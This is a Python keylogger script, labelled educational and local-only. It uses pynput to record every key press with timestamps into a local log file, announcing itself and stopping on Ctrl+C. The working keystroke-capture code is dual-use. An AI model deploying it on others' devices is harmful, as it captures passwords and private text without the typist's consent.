# keylogger.py
# Educational keylogger (local-only). Use only on devices you own.
# Captures key presses and writes readable output to logs/key_log.txt

from pynput.keyboard import Key, Listener
from datetime import datetime
import os

# ---------- Configuration ----------
LOG_DIR = "logs"                  # folder to store logs
LOG_FILE = os.path.join(LOG_DIR, "key_log.txt")  # full path to log file
# -----------------------------------

# Ensure the logs directory exists (prevents FileNotFoundError)
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

def format_key(key):
    """
    Convert a pynput Key or character into a readable string:
    - normal characters -> 'a', '1', etc.
    - space -> ' '
    - enter -> newline marker
    - backspace -> [BACKSPACE]
    - tab -> [TAB]
    - other special keys -> [KEY_NAME]
    """
    # space and enter handled separately by caller for cleanliness
    if key == Key.space:
        return " "  # single space
    if key == Key.enter:
        return "\n"
    if key == Key.backspace:
        return "[BACKSPACE]"
    if key == Key.tab:
        return "[TAB]"

    # skip pure modifier keys to avoid clutter
    if key in (Key.shift, Key.shift_r, Key.ctrl, Key.ctrl_r, Key.alt, Key.alt_r, Key.cmd):
        return None

    # key could be a Key object (like Key.f1) or a char
    s = str(key)  # examples: "'a'", "Key.f1"
    # if it's a quoted char like "'a'", remove quotes
    if s.startswith("'") and s.endswith("'"):
        return s[1:-1]
    # otherwise return name without the Key. prefix
    return f"[{s.replace('Key.', '')}]"

def on_press(key):
    """
    This function is called on every key press.
    We write a timestamp once, and then the formatted key.
    """
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    formatted = format_key(key)

    # If formatted is None, it was a modifier (Shift/Ctrl) — skip writing it
    if formatted is None:
        return

    # If it's an Enter (newline), write a timestamp then newline
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        if key == Key.enter:
            f.write(f"\n[{timestamp}] <ENTER>\n")
        else:
            # write timestamp for first character after newline for readability
            f.write(f"[{timestamp}] {formatted}\n")

def main():
    print("Keylogger started — logging to", LOG_FILE)
    print("Press Ctrl+C in this terminal to stop.")
    # Start listening to keyboard events
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
